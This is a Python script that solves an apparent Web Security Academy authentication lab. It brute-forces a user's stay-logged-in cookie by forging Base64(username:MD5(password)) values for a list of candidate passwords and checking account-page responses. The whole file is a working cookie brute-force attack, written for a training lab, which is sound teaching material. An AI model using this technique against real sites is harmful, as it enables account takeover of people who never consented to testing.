from web_security_academy.core.utils import *
from base64 import b64encode
from hashlib import md5


def solve_lab(session):
    passwords = auth_lab_passwords()
    print_info(
        "Brute-forcing Carlos's stay-logged-in cookie using the following formula:"
    )
    print('Cookie = BASE64(username + ":" + MD5(password))')

    for password in passwords:
        md5_hash = md5(password.encode())
        cookie = b64encode(f"carlos:{md5_hash.hexdigest()}".encode())
        session.cookies.set("stay-logged-in", cookie.decode())

        params = {"id": "carlos"}
        resp = session.get_path("/my-account", params=params, allow_redirects=False)

        if resp.status_code != 200:
            print_info_secondary(f"{password} => Incorrect", end="\x1b[1K")
        else:
            print_success(f"{password} => Correct!\n")
            break
    else:
        print_fail("Unable to brute-force Carlos's stay-logged-in cookie")
